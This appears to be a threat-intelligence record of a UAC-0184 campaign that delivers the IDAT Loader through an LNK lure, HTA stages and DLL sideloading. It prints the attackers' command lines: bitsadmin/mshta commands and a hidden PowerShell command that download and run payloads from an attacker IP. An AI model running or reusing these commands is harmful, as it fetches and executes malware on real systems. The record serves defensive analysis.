title: UAC-0184 Staged Malware Delivery via LNK, HTA, and DLL Sideloading
description: A Ukraine-themed LNK lure delivers a multi-stage chain via a gated HTA
  on 169.40.135.35, dropping a ZIP archive that stages DLL sideloading through Plane9/openvr_api.dll,
  decodes kernel-diag.lib to evr.dll, parses a pseudo-PNG filter.bin via XOR+LZNT1,
  and ultimately executes VSLauncher.exe with a repurposed PassMark input.dll for
  C2 over UDP multicast 224.0.0.255:31339.
attribution: UAC-0184
malware_families:
- IDAT Loader
cves: []
ttps:
  processes:
  - cmd.exe
  - bitsadmin.exe
  - mshta.exe
  - powershell.exe
  - Cluster-Overlay64.exe
  - VSLauncher.exe
  - SqlExpressChk.exe
  - vmtoolsd.exe
  - OneDriveSetup.exe
  command_lines:
  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/slippersuppity.hta
    %TEMP%\~tmp('TuRIxPyZpqoctuuvttu',).hta && mshta.exe %TEMP%\~tmp('TuRIxPyZpqoctuuvttu',).hta
  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/basketpast.hta
    %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta&& mshta.exe %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta
  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/agentdiesel.hta
    %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta&& mshta.exe %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta
  - powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command
    "& { $TempDir = $env:APPDATA; $ZipFile = \"$TempDir\\dctrprraclus.zip\"; $ExtractPath
    = \"$TempDir\\ApplicationData32\"; if (-not (Test-Path $ZipFile)) { Invoke-WebRequest
    -Uri \"169.40.135.35/dctrprraclus.zip\" -OutFile $ZipFile }; if ((-not (Test-Path
    \"$ExtractPath\\Cluster-Overlay64.exe\")) -and (-not (Test-Path \"$ExtractPath\\Scan_001.pdf\")))
    { Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force }; Start-Process
    \"$ExtractPath\\Cluster-Overlay64.exe\"; Start-Process \"$ExtractPath\\Scan_001.pdf\"
    }"
  - bitsadmin /transfer
  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/basketpast.hta
    %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta && mshta.exe %TEMP%\~tmp('MUDCoGJpbAbfKdlaKZeVfka',).hta
  - /c bitsadmin /transfer myjob /download /priority foreground http://169.40.135.35/dctrpr/agentdiesel.hta
    %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta && mshta.exe %TEMP%\~tmp('MGMXGEDCNDKaYKStLesnn',).hta
  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "kernel-diag" ;echo "";
    done
  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "filter.bin" ;echo ""; done
  - for x in *.d11 ; do printf "$x "; strings "$x" | grep "openvr_api.dll" ;echo "";
    done
  - strings Cluster-Overlay64.exe|grep "Plane9Engine.d1l"
  - python3 decode.py
  powershell:
  - '& { $TempDir = $env:APPDATA; $ZipFile = \"$TempDir\\dctrprraclus.zip\"; $ExtractPath
    = \"$TempDir\\ApplicationData32\"; if (-not (Test-Path $ZipFile)) { Invoke-WebRequest
    -Uri \"169.40.135.35/dctrprraclus.zip\" -OutFile $ZipFile }; if ((-not (Test-Path
    \"$ExtractPath\\Cluster-Overlay64.exe\")) -and (-not (Test-Path \"$ExtractPath\\Scan_001.pdf\")))
    { Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force }; Start-Process
    \"$ExtractPath\\Cluster-Overlay64.exe\"; Start-Process \"$ExtractPath\\Scan_001.pdf\"
    }'
